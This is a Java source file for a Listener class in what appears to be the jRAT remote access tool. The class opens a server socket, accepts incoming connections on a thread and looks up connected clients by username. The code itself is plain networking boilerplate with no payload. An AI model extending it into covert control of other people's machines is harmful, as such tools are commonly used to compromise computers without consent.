package net.jrat.core.listener;

import java.net.ServerSocket;
import java.util.ArrayList;
import java.util.List;

import net.jrat.core.connection.Connection;
import net.jrat.core.threads.ConnectionListener;

public class Listener
{
	public Thread thread;
	public ServerSocket serverSocket;
	
	public String name;
	public String address;
	public int port;
	
	public State state;
	
	public List<Connection> connections;
	
	public Listener(String name, String address, int port) throws Exception
	{
		this.name = name;
		this.address = address;
		this.port = port;
		
		this.state = State.STOPPED;
		this.serverSocket = new ServerSocket(port);
		this.connections = new ArrayList<Connection>();
		
		this.startThread();
	}
	
	public void startThread()
	{
		(this.thread = new Thread(new ConnectionListener(this), "listener#" + this.name)).start();
	}
	
	public Connection getConnection(String username)
	{
		for(Connection connection : this.connections)
		{
			if(connection.informations.username.equalsIgnoreCase(username))
				return connection;
		}
		
		return null;
	}
}
